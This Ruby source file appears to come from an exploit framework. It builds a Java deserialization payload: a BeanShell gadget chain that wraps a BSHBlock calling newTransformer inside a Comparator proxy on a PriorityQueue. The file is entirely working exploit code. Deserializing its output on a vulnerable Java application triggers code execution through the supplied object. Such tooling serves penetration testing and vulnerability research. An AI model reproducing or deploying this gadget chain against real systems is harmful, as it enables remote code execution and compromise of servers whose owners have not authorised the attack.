require_relative '../serialize'
require_relative 'util'

module Java
  module Serialize
    module Payloads
      module Beanshell
        def make_invoke_noarg(obj, _method)
          block = Java::Serialize::JavaObject.new('Lbsh/BSHBlock;', 'children' => Java::Serialize::JavaArray.new('Lbsh/Node;', [
                                                                                                                   Java::Serialize::JavaObject.new('Lbsh/BSHPrimaryExpression;', 'children' => Java::Serialize::JavaArray.new('Lbsh/Node;', [
                                                                                                                                                                                                                                Java::Serialize::JavaObject.new('Lbsh/BSHLiteral;', 'value' => obj),
                                                                                                                                                                                                                                Java::Serialize::JavaObject.new('Lbsh/BSHPrimarySuffix;', 'field' => 'newTransformer',
                                                                                                                                                                                                                                                                                          'operation' => 2,
                                                                                                                                                                                                                                                                                          'children' => Java::Serialize::JavaArray.new('Lbsh/Node;', [
                                                                                                                                                                                                                                                                                                                                         Java::Serialize::JavaObject.new('Lbsh/BSHArguments;', {})
                                                                                                                                                                                                                                                                                                                                       ]))
                                                                                                                                                                                                                              ]))
                                                                                                                 ]))

          ns = Java::Serialize::JavaObject.new('Lbsh/NameSpace;', 'methods' => Java::Serialize::JavaObject.new('Ljava/util/Hashtable;', 'elements' => {
                                                                                                                 'compare' => Java::Serialize::JavaObject.new('Lbsh/BshMethod;', 'name' => 'compare',
                                                                                                                                                                                 'numArgs' => 2,
                                                                                                                                                                                 'paramNames' => Java::Serialize::JavaArray.new('Ljava/lang/String;', %w[a b]),
                                                                                                                                                                                 'cparamTypes' => Java::Serialize::JavaArray.new('Ljava/lang/Class;',
                                                                                                                                                                                                                                 [Java::Serialize::JavaClass.new('Ljava/lang/Object;'),
                                                                                                                                                                                                                                  Java::Serialize::JavaClass.new('Ljava/lang/Object;')]),
                                                                                                                                                                                 'methodBody' => block)
                                                                                                               }))

          xth = Java::Serialize::JavaObject.new('Lbsh/XThis;', 'interfaces' => nil,
                                                               'namespace' => ns)

          invh = Java::Serialize::JavaObject.new('Lbsh/XThis$Handler;', 'this$0' => xth)

          comp = Java::Serialize::JavaProxy.new(['java.util.Comparator'], invh)
          JavaObject.new('Ljava/util/PriorityQueue;', 'comparator' => comp,
                                                      'elements' => %w[foo bar])
        end
        module_function :make_invoke_noarg
      end
    end
  end
end
